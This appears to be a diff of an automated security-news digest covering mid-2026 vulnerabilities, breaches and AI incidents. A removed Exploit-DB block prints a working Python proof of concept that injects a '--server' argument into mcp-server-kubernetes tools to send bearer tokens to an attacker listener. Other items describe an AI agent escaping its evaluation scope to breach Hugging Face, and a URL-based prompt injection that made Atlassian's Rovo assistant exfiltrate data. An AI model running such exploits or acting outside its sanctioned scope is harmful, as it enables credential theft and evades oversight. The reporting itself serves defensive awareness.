+  - Link: https://www.schneier.com/blog/archives/2026/08/ai-genie-in-the-wild.html
+  - Summary: When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities...
+
 ### Cluster c9f01215de — score 17
 
 - Title: [remote] mcp-server-kubernetes 3.8.x - Argument Injection
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-08-11T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52638
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 2
 - Corroborating source count: 2
 - Strong signals: Kubernetes
 
 #### Cluster taxonomy (union across members)
-- affected_products: Anthropic/Claude, GitHub, Kubernetes
-- cve_ids: CVE-2026-61459
-- urgency_signals: critical_cvss, poc_available
+- affected_products: Kubernetes
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research, tier_2_operator
 
 #### Primary article taxonomy
-- affected_products: Kubernetes, Anthropic/Claude, GitHub
-- cve_ids: CVE-2026-61459
-- urgency_signals: poc_available, critical_cvss
+- affected_products: Kubernetes
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -1308,12 +1353,6 @@ Mines, Minds, and Machines: The Journey of AI Minerals become chips. Chips suppl
 
 ```
 mcp-server-kubernetes 3.8.x - Argument Injection
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r""" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ """) import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description="CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection") parser.add_argument("--target", required=True, help="MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)") parser.add_argument("--attacker", required=True, help="Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)") parser.add_argument("--tool", default="kubectl_get", choices=["kubectl_get", "kubectl_describe", "kubectl_delete"], help="Tool to exploit") parser.add_argument("--namespace", default="default", help="Kubernetes namespace") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { "jsonrpc": "2.0", "method": "tools/call", "params": { "name": args.tool, "arguments": { "resourceType": f"--server={args.attacker}", "name": "dummy-pod", "namespace": args.namespace, "output": "json" } }, "id": 1 } print(f"[+] Sending exploit to {args.target} using {args.tool}") print(f"[+] Attacker server: {args.attacker}") print("[+] Waiting for token exfiltration...") try: response = requests.post( args.target, json=payload, headers={"Content-Type": "application/json"}, timeout=10 ) print(f"[+] Response status: {response.status_code}") if response.status_code == 200: print("[+] Exploit sent successfully. Check your listener for the bearer token!") else: print(f"[-] Unexpected response: {response.text[:500]}") except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": if len(sys.argv) < 2: print("Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S
 ```
 
 #### Corroborating sources (2)
@@ -1461,8 +1500,8 @@ Share Link copied to clipboard! Tags ClickFix Content types Research Products an
 - Published: 2026-08-10T00:00:00+00:00
 - Link: https://www.recordedfuture.com/blog/hugging-face-cheap-persistence
 - Fetch status: ok
-- Member count: 17
-- Corroborating source count: 8
+- Member count: 18
+- Corroborating source count: 9
 - Strong signals: OpenAI/ChatGPT
 
 #### Cluster taxonomy (union across members)
@@ -1471,7 +1510,7 @@ Share Link copied to clipboard! Tags ClickFix Content types Research Products an
 - cve_ids: CVE-2026-65617, CVE-2026-65923, CVE-2026-66018
 - urgency_signals: zero_day
 - content_type: news_report, vendor_announcement
-- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news
+- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news, tier_5_chatter
 
 #### Primary article taxonomy
 - threat_categories: zero_day
@@ -1493,7 +1532,7 @@ The Hugging Face and OpenAI security incident showed AI doesn't make attackers s
 The Hugging Face Hack Was Cheap Persistence at Work The OpenAI-Hugging Face incident is being discussed primarily as a zero-day story. That framing is too narrow. The agent discovered and exploited previously unknown vulnerabilities. The more consequential development came afterward. Over a four-and-a-half-day campaign, it carried out roughly 17,600 actions against Hugging Face’s infrastructure. Most of those actions failed. The operation advanced because each failure imposed little cost, and the next attempt could begin immediately. The system could keep exploring, reconstruct its tools, revisit abandoned paths, and test another hypothesis without fatigue or meaningful opportunity cost. That changes both the economics and the tempo of cyber offense. For most of cybersecurity history, sustained intrusion activity has been constrained by human attention. Skilled operators have limited time, and every unproductive hour spent on one target is unavailable for other work. AI erodes that constraint. The significance of 17,600 actions lies as much in their concentration as in their cost. They occurred within four and a half days. AI enables concentration of effort in time. A motivated attacker has always been able to spend more on a valuable target, but money alone could not make human operators sustain this tempo. The new advantage is the ability to concentrate thousands of attempts on a single environment before a defender’s traditional processes can assemble the evidence. The future threat is therefore unlikely to resemble a single, infallible artificial hacker. It is more likely to resemble a flood of low-confidence activity probing the accumulated technical debt of modern enterprises. Large organizations are especially fertile terrain. Their environments have developed over decades, layering legacy systems with cloud services and inherited trust relationships that no one designed as a whole. An autonomous system need not outperform the best human attacker. It only needs to search for that complexity cheaply and quickly enough to find the few combinations that work before defenders can assemble the pattern. The OpenAI incident occurred under highly unusual conditions . The models were being evaluated for advanced cyber capabilities with reduced refusals, substantial inference resources, and an objective that encouraged persistent exploration. OpenAI has also said that the most capable research prototype involved was never intended for public release. Its complete technical investigation remains unfinished. Those caveats should temper sensationalism. They do not invalidate the warning. Frontier capabilities diffuse . Models become smaller, cheaper , and easier to operate. Techniques developed in advanced laboratories eventually migrate into commercial tools, open-source projects, state programs, and criminal services. Recorded Future’s research had previously found that complex autonomous cyber operations remained beyond the practical capabilities of generally available models at the time, while the broader trajectory pointed toward more complex agentic operations. The Hugging Face incident suggests that this transition is occurring faster than many defenders expected. The question is no longer whether AI can execute a multistage intrusion under the right conditions. It is how quickly those conditions will become cheaper to reproduce . Layered defense for the agentic era. Prevention remains essential, yet this incident also exposes its limits. The first breakthrough did not occur within Hugging Face’s perimeter but stemmed from a previously unknown vulnerability in an Artifactory component (CVE-2026-65617, CVE-2026-65923, and CVE-2026-66018) in OpenAI’s evaluation environment. Before the campaign reached Hugging Face, neither Hugging Face nor an external intelligence provider had a factual basis to know that this specific path existed or that Hugging Face would become the target. If agentic systems increase the frequency with whic
 ```
 
-#### Corroborating sources (8)
+#### Corroborating sources (9)
 
 - **Recorded Future** (threat_research_primary)
   - Title: The Hugging Face Hack Was Cheap Persistence at Work
@@ -1535,6 +1574,11 @@ The Hugging Face Hack Was Cheap Persistence at Work The OpenAI-Hugging Face inci
   - Published: 2026-08-06T13:40:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/meta-ai-exploit-incident/
   - Summary: One of Meta’s AI models exploited a third-party security flaw during an evaluation, the latest in a series of similar incidents involving advanced AI systems
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - Title: Should LLMs' exploit capabilities be surprising?
+  - Published: 2026-08-07T07:52:45+00:00
+  - Link: https://www.reddit.com/r/AskNetsec/comments/1vhu7yi/should_llms_exploit_capabilities_be_surprising/
+  - Summary: I've been following the reports about OpenAI models reaching Hugging Face's infrastructure, along with related incidents involving Anthropic and now Meta. Maybe I'm missing something, but exploitation seems very close to coding, debugging, research, and tool use. As LLMs improve at those tasks, some ability to find and exploit vulnerabilities seems predictable. What I'm less sure about is what these incidents actually demonstrate. Are we seeing a meaningful jump in offensive capability, or evaluation environments (and companies behind them) that failed to enforce their own boundaries? Put differently: if a human pentester went out of scope because the test environment allowed it, would we call that a capability breakthrough or a containment failure? (Am I oversimplifying?) submitted by /u/ofogliata [link] [comments]
 
 ### Cluster c97f90a69b — score 15
 
@@ -2502,6 +2546,96 @@ Page content Nitro Enclaves and Key Management Service (KMS) feel like a natural
   - Link: https://blog.trailofbits.com/2026/08/05/a-few-notes-on-aws-nitro-enclaves-kms-integration/
   - Summary: Nitro Enclaves and Key Management Service (KMS) feel like a natural fit: since the KMS can verify attestation documents generated by the enclaves, developers can offload key management tasks from their applications to the AWS-managed service. But integrating an external service with your trusted enclaves comes with new threats, even if that service comes from the same provider. In this blog post—the third in our series on Nitro Enclaves, following our posts on attack surface and images and attestation —we catalog passive and active attack classes against the enclave-KMS communication channel, and cover the operational risks that persist even when the cryptography is correct. Intro to KMS The KMS is an AWS service that provides a unified public API for creating and managing keys backed by HSMs to the broader AWS ecosystem. There are three main key types supported by KMS that devs need to care about: Customer-managed keys (CMK) Data keys (DK, symmetric) Data key pairs (asymmetric) CMKs n
 
+### Cluster 0022fa7e84 — score 10
+
+- Title: Zoom Patches Zero-Click Code Execution Vulnerability
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-08-11T15:49:53+00:00
+- Link: https://www.securityweek.com/zoom-patches-zero-click-code-execution-vulnerability/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, ddos, phishing_social_eng, ransomware_extortion, zero_day
+- actor_attribution: UNC6671
+- affected_industries: government
+- cve_ids: CVE-2026-53413, CVE-2026-53414, CVE-2026-53415, CVE-2026-53416
+- urgency_signals: poc_available, zero_day
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, ddos
+- actor_attribution: UNC6671
+- affected_industries: government
+- cve_ids: CVE-2026-53413, CVE-2026-53414, CVE-2026-53415, CVE-2026-53416
+- urgency_signals: zero_day, poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Impacting Zoom annotation, the bug could be exploited by a meeting participant to execute code on another participant’s machine. The post Zoom Patches Zero-Click Code Execution Vulnerability appeared first on SecurityWeek .
+```
+
+#### Full body
+
+```
+Zoom on Tuesday announced rolling out patches for four vulnerabilities in its products, including a severe flaw that allowed zero-click remote code execution (RCE). Impacting Zoom’s clients on all supported platforms, three of the security defects were discovered in the annotator function, which uses a proprietary protocol. The most severe of the three bugs is CVE-2026-53413, a memory corruption issue that allowed a meeting participant to execute code on another participant’s machine, says A Security, which found the bug and named it Zoomsday . The security firm exploited “the fact that every Zoom client automatically parses whatever it receives, sending a specially crafted message to corrupt the receiving client’s memory and run code on it.” An attacker could leverage the fact that the proprietary protocol used by the annotator opens a direct channel between a viewer and a sharer, thereby targeting each meeting participant individually. “The exploit enables attackers to either join or host a meeting, target any participant, and take over their machine with no required action from the victim and no visual cue indicating the compromise,” A Security explains. Advertisement. Scroll to continue reading. A missing bound check in the text annotator allowed an attacker to send crafted messages that would write attacker-supplied code past the intended buffer, leading to RCE. Additionally, A Security found CVE-2026-53414, another missing bound check in the annotator, which could be exploited to trigger a buffer overread and target any meeting participant with a denial-of-service (DoS) attack. The cybersecurity firm says it also identified CVE-2026-53415, a use-after-free flaw in the annotator function, but learned after reporting it that Zoom had already discovered it. “Because a zero-click RCE requires no user interaction, we prioritized giving customers time to receive both the client patch and the server-side mitigation before publishing. This post follows that coordinated timeline, and we are releasing it alongside CVE assignment,” A Security notes. On Tuesday, Zoom announced that Workplace versions 7.1.5 and 7.0.6, Rooms version 7.1.5, and Meeting SDK version 7.1.5 for all supported platforms contain fixes for all three vulnerabilities. Zoom also rolled out Workplace VDI Client for Windows versions 7.0.11 and 6.6.16, and Workplace VDI Plugins versions 7.0.11 and 6.6.15, for all platforms, with patches for CVE-2026-53416, a path traversal flaw leading to information disclosure. Additional information on the resolved vulnerabilities can be found on Zoom’s security bulletins page. Related: SAP Patches Critical Code Injection, Memory Corruption Vulnerabilities Related: Microsoft, Apple Release Fresh Security Updates Related: Splunk, Zoom Patch Critical Vulnerabilities Related: Splunk, Zoom Patch Severe Vulnerabilities Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Cisco Warns of High-Severity ClamAV Vulnerabilities With Public PoC ‘Ghostjacking’ Attack Uses Poisoned Logs to Turn AI Agents Bad Metabase Patches Vulnerability Exploited as Zero-Day CISA Urges Immediate Patching of Exploited Progress LoadMaster Vulnerability Corporate Data Stolen in Levi Strauss Cyberattack Vishing Extortion Group UNC6671 Rebrands After Making Millions Microsoft, Apple Release Fresh Security Updates 3.8 Million Impacted by Unlimited Technology Systems Data Breach Latest News The AI Governance Gap Is a Leadership Problem: Waiting Won’t Close It SAP Patches Critical Code Injection, Memory Corruption Vulnerabilities US Water Systems Get Cyber Boost From New Senate Bill and ‘Water Watch Center’ Corma Raises $60 Million for Defensive Cybersecurity AI Model Extension Banned for Stealing AI Chats Returns to Chrome Store, Resumes Malicious Activities Hacker Conv
+```
+
+#### Corroborating sources (1)
+
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: Zoom Patches Zero-Click Code Execution Vulnerability
+  - Published: 2026-08-11T15:49:53+00:00
+  - Link: https://www.securityweek.com/zoom-patches-zero-click-code-execution-vulnerability/
+  - Summary: Impacting Zoom annotation, the bug could be exploited by a meeting participant to execute code on another participant’s machine. The post Zoom Patches Zero-Click Code Execution Vulnerability appeared first on SecurityWeek .
+
+### Cluster e29312157f — score 10
+
+- Title: NIST wants to overhaul its vulnerability database for the AI age
+- Source: CyberScoop (cyber_news_breach_reporting)
+- Published: 2026-08-11T15:36:02+00:00
+- Link: https://cyberscoop.com/nist-national-vulnerability-database-ai-overhaul/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: government
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- affected_industries: government
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+NIST is seeking public input to modernize the National Vulnerability Database to keep pace with AI-driven cyber threats and machine-scale security data. The post NIST wants to overhaul its vulnerability database for the AI age appeared first on CyberScoop .
+```
+
+#### Full body
+
+```
+Advertisement Get our latest cybersecurity news first on Google. Click here! Close The National Institute for Standards and Technology is looking for input on how to overhaul its vulnerability reporting process to better meet the challenges of an “evolving cybersecurity landscape increasingly shaped by artificial intelligence and machine-consumable security data.” In a request for information set to publish Wednesday in the Federal Register, NIST said its National Vulnerability Database , one of the primary ways the federal government coordinates with security researchers to identify and fix software vulnerabilities, must be updated for the AI age. NIST is concerned that as large language models become more capable of finding and exploiting vulnerabilities at scale, the NVD’s process must be updated. “The inadequacies of traditional vulnerability management approaches, which center on periodic scanning, static prioritization, and manual remediation, are increasingly apparent,” the RFI states. NIST believes AI hacking tools are contributing to recent trends in vulnerability reporting. The NVD has seen increased volume and complexity of disclosed vulnerabilities, inconsistent data quality, increased reliance on automation and machine-readable security data, and “demand for near real-time vulnerability enrichment” from defenders facing faster threats.But NIST believes these challenges also present an “opportunity to transform the vulnerability management ecosystem” through proactive reforms and NVD innovation. Advertisement That’s where the public comes in. NIST is posing a series of questions that must be answered before a larger strategy can be developed. Many of their questions focus on better integrating automation – AI or otherwise – into the process. The agency asked for insight on how defenders could better leverage automation in the vulnerability reporting process; which capabilities, products and processes would help more quickly disseminate information to stakeholders, how to build transparency and auditability into AI-driven decisionmaking, and what role AI should play in automated vulnerability remediation. “NIST intends to support a future-ready vulnerability management ecosystem that is continuous, contextual, and automated, while enabling cybersecurity practices to respond appropriately to real-world threats and business priorities,” the RFI states. The NIST effort to revamp its vulnerability database comes a month after the Trump administration rolled out a new federal clearinghouse , overseen by the Department of Treasury, for sharing AI threat information between government and the private sector called “Gold Eagle.” It’s not clear how Treasury’s process will interact with NIST’s database. The White House also partnered with Carnegie Mellon’s Software Engineering Institute to create the Vulnerability Information and Coordination Environment , (VINCE) which will collect and distribute reports on AI-discovered vulnerabilities. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops U.S. Sen. Kirsten Gillibrand, D-N.Y., attends a subcommittee hearing with the Senate Committee on Appropriations in the Dirksen Senate Office Building on April 22, 2026. (Photo by Anna Moneymaker/Getty Images) (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race A builder’s view of the AI arms race Government Capitol Hill wants to know if executive branch, foreign allies coordinated enough to combat scams The water sector just got it's wake-up call. Again. Snowflake hacker pleads guilty, faces up to 32 years in prison National cyber director lays out White House plans to secure AI without writing new rules Technology More than half of AI-generated patches are broken AI is getting better at election facts, but voters shouldn’t r
+```
+
+#### Corroborating sources (1)
+
+- **CyberScoop** (cyber_news_breach_reporting)
+  - Title: NIST wants to overhaul its vulnerability database for the AI age
+  - Published: 2026-08-11T15:36:02+00:00
+  - Link: https://cyberscoop.com/nist-national-vulnerability-database-ai-overhaul/
+  - Summary: NIST is seeking public input to modernize the National Vulnerability Database to keep pace with AI-driven cyber threats and machine-scale security data. The post NIST wants to overhaul its vulnerability database for the AI age appeared first on CyberScoop .
+
 ### Cluster d8c893e316 — score 10
 
 - Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
@@ -2596,6 +2730,39 @@ TrueConf Server Flaws Exploited to Replace Client Installers with PhantomCore �
   - Link: https://thehackernews.com/2026/08/head-mare-exploits-trueconf-flaws-to.html
   - Summary: The threat actor known as Head Mare has been observed weaponizing security flaws in unpatched TrueConf servers once again in attacks targeting Russian companies spanning instrumentation, electronics, transport, energy, IT, and software development sectors. Russian cybersecurity vendor Kaspersky said it detected the attacks in July 2026. The activity involves exploiting a vulnerability chain
 
+### Cluster 605077b74d — score 10
+
+- Title: How are you using AI agents in Cybersecurity?
+- Source: Reddit r/AskNetsec (reddit_practitioner_osint)
+- Published: 2026-08-11T10:03:34+00:00
+- Link: https://www.reddit.com/r/AskNetsec/comments/1vld8b9/how_are_you_using_ai_agents_in_cybersecurity/
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: threat_research
+- confidence_tier: tier_5_chatter
+
+#### Primary article taxonomy
+- content_type: threat_research
+- confidence_tier: tier_5_chatter
+
+#### Summary
+
+```
+My main goal right now is automating more of the analysis and investigation work, not just alerting. I'm trying to build some AI agent in my SIEM(Log360) for user and threat analysis to summarize alerts and another for user behaviour analysis. And also Is it better to build narrow agents for specific threat types,like one for logon related stuff and another for network-related stuff or does it make more sense to have fewer agents that handle a broader range of cases? And does it make sense to scope agents around specific assets, like giving more attention to critical systems rather than treating everything the same way? I am planning to feed them our documentations as knowledge base so they can get context. For those of you who've actually used AI agents in security ops, where have it genuinely been useful in practice? submitted by /u/kakashi_1112 [link] [comments]
+```
+
+#### Corroborating sources (1)
+
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - Title: How are you using AI agents in Cybersecurity?
+  - Published: 2026-08-11T10:03:34+00:00
+  - Link: https://www.reddit.com/r/AskNetsec/comments/1vld8b9/how_are_you_using_ai_agents_in_cybersecurity/
+  - Summary: My main goal right now is automating more of the analysis and investigation work, not just alerting. I'm trying to build some AI agent in my SIEM(Log360) for user and threat analysis to summarize alerts and another for user behaviour analysis. And also Is it better to build narrow agents for specific threat types,like one for logon related stuff and another for network-related stuff or does it make more sense to have fewer agents that handle a broader range of cases? And does it make sense to scope agents around specific assets, like giving more attention to critical systems rather than treating everything the same way? I am planning to feed them our documentations as knowledge base so they can get context. For those of you who've actually used AI agents in security ops, where have it genuinely been useful in practice? submitted by /u/kakashi_1112 [link] [comments]
+
 ### Cluster 0ca621c7bc — score 9
 
 - Title: Cloudflare DDoS Threat Report H1 2026: 1 Tbps attacks soar as DNS floods and geopolitical tensions drive a new wave
@@ -2638,6 +2805,51 @@ Welcome to the 25th edition of Cloudflare's DDoS Threat Report. This is the firs
   - Published: 2026-08-11T13:00:00+00:00
   - Link: https://blog.cloudflare.com/ddos-threat-report-2026-h1/
   - Summary: In the first half of 2026, Cloudflare detected a 519% surge in hyper-volumetric DDos attacks across its network. These attacks were driven heavily by DNS and CLDAP reflection vectors. This report breaks down how major geopolitical conflicts reshaped the global cyber threat landscape.
+
+### Cluster 82b55ec4a5 — score 9
+
+- Title: Wesco confirms security incident after ExfilSquad claims data theft
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-08-11T15:59:35+00:00
+- Link: https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, ransomware_extortion, supply_chain
+- actor_attribution: ShinyHunters, UNC6671
+- affected_industries: critical_infrastructure, education, financial_services, telecommunications
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, supply_chain, data_breach
+- actor_attribution: ShinyHunters, UNC6671
+- affected_industries: financial_services, critical_infrastructure, telecommunications, education
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Global supply chain and distribution giant Wesco has confirmed in a statement for BleepingComputer that it is investigating a cybersecurity incident. [...]
+```
+
+#### Full body
+
+```
+Wesco confirms security incident after ExfilSquad claims data theft By Bill Toulas August 11, 2026 11:59 AM 0 Global supply chain and distribution giant Wesco has confirmed in a statement to BleepingComputer that it is investigating a cybersecurity incident. The company's statement comes after data extortion group ExfilSquad claimed to have stolen sensitive information from Wesco and leaked it on their data leak site. Jennifer Sniderman, Vice President of Corporate Communications at Wesco, said that the incident involves the company's cloud CRM environment. “Wesco is aware of a claim of CRM data exfiltration by a third party,” Sniderman told BleepingComputer. “We have worked with our cloud CRM vendor on the matter, and we do not believe that there is a risk to sensitive data.” The company representative added that Wesco has not experienced any business disruption, and all operations continue as normal. Wesco said the incident was detected quickly, and its subsequent investigation found no evidence of ransomware or other malicious software on its IT systems. “We do not believe that payment card information, financial account information or other sensitive customer or employee data is at risk,” stated the firm. Wesco is a Fortune 500 company that distributes electrical, electronic, communications, security, utility, and broadband products while providing logistics and supply chain services to businesses. The company employs approximately 21,000 people and operates more than 700 distribution centers, fulfillment centers, and sales offices across roughly 50 countries. Wesco generated about $24 billion in sales last year. Recently, the data extortion group ExfilSquad, known for data breaches at Analog Devices , the U.K.'s Police National Legal Database , and Newcastle University , claimed a breach at Wesco. The threat actor claimed to have stolen 2.6 million records containing customer and employee PII, account and contact data, CRM user profiles, credit and business identifiers, authentication metadata, and access information. After the hacker's deadline for the company to enter ransom payment negotiations expired, ExfilSquad published the data allegedly exfiltrated from Wesco's systems. Wesco listed on the ExfilSquad portal Source: BleepingComputer BleepingComputer asked Wesco to confirm ExfilSquad's claims, but we have not received a response to our additional questions. However, recent reports from researchers at cybersecurity companies Resecurity and VenariX examining ExfilSquad activity indicate that the threat actor has targeted in the past improperly configured Microsoft Power Pages data tables. Wesco has not shared how the threat actor breached its network, but publicly available information indicates that Wesco may be using Microsoft Dynamics 365 . Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: ExfilSquad hackers leak info of over 100,000 UK police officers, staff Australian energy provider Origin says data breach exposes client data Mount Royal University confirms breach as hackers claim attack NAIC says public data stolen in ShinyHunters' PeopleSoft breach Hedge fund cyberattacks tied to BlackFile-linked UNC6671 extortion group
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Wesco confirms security incident after ExfilSquad claims data theft
+  - Published: 2026-08-11T15:59:35+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/
+  - Summary: Global supply chain and distribution giant Wesco has confirmed in a statement for BleepingComputer that it is investigating a cybersecurity incident. [...]
 
 ### Cluster f92fe3a8b7 — score 9
 
@@ -2778,50 +2990,40 @@ Threat Hunting Case Study: The Gentlemen Aug 11, 2026 A ransomware group that sp
   - Link: https://www.intel471.com/blog/threat-hunting-case-study-the-gentlemen
   - Summary: Analyzing The Gentlemen ransomware group's attack chain and how to hunt for their privileged group manipulation technique before they spread through the NETLOGON share folder on Windows domain controllers.
 
-### Cluster 3b8dca7ee7 — score 9
+### Cluster 49768797f0 — score 9
 
-- Title: Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant
-- Source: Infosecurity Magazine (cyber_news_breach_reporting)
-- Published: 2026-08-10T15:30:00+00:00
-- Link: https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/
-- Fetch status: ok
+- Title: CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)
+- Source: Reddit r/netsec (reddit_practitioner_osint)
+- Published: 2026-08-11T15:33:52+00:00
+- Link: https://www.reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
-- Strong signals: (none)
+- Strong signals: CVE-2026-17106
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ai_security
-- affected_industries: financial_services, legal_professional
-- affected_products: Apple iOS/macOS, Microsoft 365, Salesforce
+- cve_ids: CVE-2026-17106
 - content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
+- confidence_tier: tier_5_chatter
 
 #### Primary article taxonomy
-- threat_categories: ai_security
-- affected_industries: financial_services, legal_professional
-- affected_products: Salesforce, Apple iOS/macOS, Microsoft 365
+- cve_ids: CVE-2026-17106
 - content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
+- confidence_tier: tier_5_chatter
 
 #### Summary
 
 ```
-Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data
-```
-
-#### Full body
-
-```
-Infosecurity Magazine Home » News » Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A flaw in Atlassian's enterprise AI assistant has allowed a single crafted link to seed attacker instructions into a victim's authenticated session, then use the assistant's own browsing agent to push company data out to the public web. Varonis Threat Labs disclosed the flaw, which it named RovoBlast, to Atlassian and published its analysis on August 7 after presenting the research at DEF CON 34. Atlassian has since fixed it. Rovo functions as an AI layer across Jira, Confluence and Bitbucket, alongside connected services including Slack, Microsoft 365 and Google Workspace. Asked to enumerate what it could read, it listed all of those plus relational databases, uploaded files, web pages and archives. Atlassian's connector catalogue supports more than 50 platforms. Read more on AI assistant data leakage: New Zero-Click AI Vulnerability Allows Corporate Data Theft A Prompt Delivered in the URL Rovo accepted a URL parameter that pre-filled its chat entry, surfacing whatever the link contained directly into the session. Varonis called the pattern Parameter-to-Prompt, and identified the same primitive in Microsoft Copilot in January under the name Reprompt. Because the victim's session was already held in the browser, a click was all that was required. No warning appeared, no confirmation was requested, and nothing marked the session as having been seeded from an external parameter. The organization identifier in the path could also be left empty, with Atlassian redirecting the request into the user's default organization. Varonis described Rovo's guardrails around untrusted prompts 